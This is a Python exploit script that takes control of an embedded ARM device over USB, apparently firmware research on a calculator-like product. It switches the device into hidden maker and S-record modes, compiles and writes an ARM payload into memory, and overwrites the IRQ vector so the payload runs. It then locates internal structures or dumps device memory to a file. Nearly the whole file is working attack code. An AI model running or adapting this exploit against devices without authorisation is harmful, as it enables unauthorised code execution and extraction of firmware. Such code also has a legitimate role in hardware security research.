import argparse
import usb.core
import usb.util
import time
import os.path
import tempfile
import subprocess
import struct
import tqdm


PAYLOAD_PATH = os.path.dirname(os.path.realpath(__file__))
LINKER = """
ENTRY(start)

SECTIONS
{
  . = BASE;

  .text     : { *(.text.start) *(.text   .text.*   .gnu.linkonce.t.*) }
  .rodata   : { *(.rodata .rodata.* .gnu.linkonce.r.*) }
  .bss      : { *(.bss    .bss.*    .gnu.linkonce.b.*) *(COMMON) }
  .data     : { *(.data   .data.*   .gnu.linkonce.d.*) }
  /DISCARD/ : { *(.interp) *(.dynsym) *(.dynstr) *(.hash) *(.dynamic) *(.comment) }
}
"""

COMPILE = ["arm-none-eabi-gcc", "-c", "-Os", "-march=armv4", "-fno-builtin-printf", "-fno-strict-aliasing", "-fno-builtin-memcpy", "-fno-builtin-memset", "-fno-builtin"]
LINK = ["arm-none-eabi-gcc", "-nodefaultlibs", "-nostdlib"]
OBJCOPY = ["arm-none-eabi-objcopy", "-O", "binary"]


class PayloadBuilder:

    def __init__(self, srcfile):
        with open(os.path.join(PAYLOAD_PATH, srcfile)) as inf:
            self.src = inf.read()

    def build(self, **kwargs):
        base = kwargs["base"]
        src = self.src
        for arg, replacement in kwargs.items():
            src = src.replace("%{}%".format(arg), str(replacement))

        with tempfile.TemporaryDirectory() as tmp:
            p_linker_x = os.path.join(tmp, "linker.x")
            p_payload_c = os.path.join(tmp, "payload.c")
            p_payload_o = os.path.join(tmp, "payload.o")
            p_payload = os.path.join(tmp, "payload")
            p_payload_bin = os.path.join(tmp, "payload.bin")

            with open(p_linker_x, "w") as outf:
                outf.write(LINKER.replace("BASE", hex(base)))
            with open(p_payload_c, "w") as outf:
                outf.write(src)
            subprocess.check_output(COMPILE + ["-o", p_payload_o, p_payload_c])
            subprocess.check_output(LINK + ["-T", p_linker_x, "-o", p_payload, p_payload_o])
            subprocess.check_output(OBJCOPY + [p_payload, p_payload_bin])
            with open(p_payload_bin, "rb") as inf:
                payload = inf.read()
        return payload


def make_srec(dst, data):
    payload_sz = 1 + 4 + len(data)
    assert payload_sz < 0x100

    payload = bytearray(payload_sz)
    payload[0] = payload_sz
    payload[1:5] = struct.pack(">I", dst)
    payload[5:] = data

    assert len(payload) == payload_sz

    return "S3" + payload.hex() + bytes([~(sum(payload) & 0xFF) & 0xFF]).hex()


class Exploit:

    def __init__(self):
        parser = argparse.ArgumentParser()
        parser.add_argument('--vid', type=lambda x: int(x, 16), required=True)
        parser.add_argument('--pid', type=lambda x: int(x, 16), required=True)
        parser.add_argument('--addr', type=lambda x: int(x, 16), required=True)
        parser.add_argument('module', choices=['locate_commdesc', 'dump_memory'])
        parser.add_argument('--dump_addr', type=lambda x: int(x, 16))
        parser.add_argument('--dump_size', type=lambda x: int(x, 16))
        parser.add_argument('--commdesc', type=lambda x: int(x, 16))

        args = parser.parse_args()
        if args.module == "dump_memory":
            if args.dump_addr is None or args.dump_size is None or args.commdesc is None:
                raise RuntimeError("dump_addr, dump_size and commdesc are required for dump_memory")

        self.args = args
        self.counter = 0xAA

    def readout(self, addr):
        self.counter = (self.counter + 1) % 256
        if self.counter == 0:
            self.counter = 1

        # argument for the payload
        self.dev.write(3, make_srec(self.args.addr + 0x10000, struct.pack("<I", addr)))

        # trigger the interrupt "once" check
        self.dev.write(3, make_srec(self.args.addr + 0x20000, struct.pack("B", self.counter) + b"\x00" * 3))

        while True:
            desc = bytearray(self.dev.ctrl_transfer(0x80, 0x06, 0x0100, 0x00, 0x40))
            if desc[1] == self.counter:
                break

        data = desc[2:]
        return data

    def run(self):
        self.dev = usb.core.find(idVendor=self.args.vid, idProduct=self.args.pid)
        if self.dev is None:
            raise RuntimeError("cannot find device with VID={:04X} PID={:04X}".format(self.args.vid, self.args.pid))

        print("Enter maker mode...")

        # validate support for mode =0xC0
        data = bytearray(self.dev.ctrl_transfer(0x41, 0x62, 0x00, 0, b"\x02\xC0"))
        self.dev.read(0x81, 256)

        # set ep to mode 0xC0
        self.dev.ctrl_transfer(0x41, 0x60, 0xC0, 0)
        self.dev.read(0x81, 256)

        # enter maker mode
        self.dev.write(3, bytes.fromhex("FF 56 55 42 00 03 C1 01 00 FE"))

        time.sleep(0.5)

        print("Enter srec mode...")
        self.dev.write(3, bytes.fromhex("FF 55 56 42 00 01 01 FE"))

        time.sleep(0.5)

        while True:
            self.dev = None
            for vid, pid in [(0x045b, 0x0033), (0x045b, 0x0035), (0x045b, 0x004c), (0x04c5, 0x10ca)]:
                self.dev = usb.core.find(idVendor=vid, idProduct=pid)
                if self.dev is not None:
                    time.sleep(1)
                    self.dev = usb.core.find(idVendor=vid, idProduct=pid)
                    break

            if self.dev is None:
                print("Waiting for srec mode...")
                time.sleep(1)
            else:
                break

        self.dev.ctrl_transfer(0x41, 0x62, 0x00, 0, b"\x02\xC0")
        time.sleep(0.5)
        self.dev.ctrl_transfer(0x41, 0x60, 0xC0, 0)
        time.sleep(0.5)
        handshake = bytearray(self.dev.read(0x82, 4096))
        assert handshake == bytes.fromhex("4442800000000008")

        print("In srec mode")
        print("Manufacturer : {}".format(usb.util.get_string(self.dev, self.dev.iManufacturer)))
        print("Product      : {}".format(usb.util.get_string(self.dev, self.dev.iProduct)))

        print("Writing payload at 0x{:08X}".format(self.args.addr))
        payload_for = { "locate_commdesc": "payload_scanner.c", "dump_memory": "payload_memdump.c" }
        payload_args = {"base": self.args.addr}
        if self.args.commdesc is not None:
            payload_args["commdesc"] = hex(self.args.commdesc)
        payload = PayloadBuilder(payload_for[self.args.module]).build(**payload_args)
        # 4k to try bursting the cache
        payload += b"\x00" * (4 * 1024 - len(payload))

        for x in range(0, len(payload), 0x80):
            data = make_srec(self.args.addr + x, payload[x:x+0x80])
            assert self.dev.write(3, data) == len(data)
            time.sleep(0.1)

        # ovewrite the IRQ interrupt
        self.dev.write(3, make_srec(0xFFFFFFFF, b"\xFF" + b"\x00" * 0x18 + struct.pack("<II", 0xe51ff004, self.args.addr)))

        print("Waiting for the payload to come up")
        print("if nothing happens, check the --addr value (try 0xe55b0000, 0x64000000)")

        if self.args.module == "locate_commdesc":
            while True:
                time.sleep(0.1)
                data = bytearray(self.dev.ctrl_transfer(0x80, 0x06, 0x0100, 0x00, 0x40))[1:]
                if data[0:4] == b"\xde\xad\xbe\xef":
                    break

            print("Success!")
            commdesc, usb_interrupt = struct.unpack_from("<II", data[4:])
            print("commdesc=0x{:X}".format(commdesc))
            print("usb_interrupt=0x{:X}".format(usb_interrupt))
        elif self.args.module == "dump_memory":
            output = "dump.{}-{}.bin".format(hex(self.args.dump_addr), hex(self.args.dump_size))
            print("Dumping {}".format(output))
            with open(output, "wb") as outf:
                with tqdm.tqdm(total=self.args.dump_size, unit='B', unit_scale=True, unit_divisor=1024) as bar:
                    for addr in range(self.args.dump_addr, self.args.dump_addr+self.args.dump_size, 0x10):
                        outf.write(self.readout(addr))
                        outf.flush()

                        bar.update(16)


def main():
    Exploit().run()


if __name__ == "__main__":
    main()
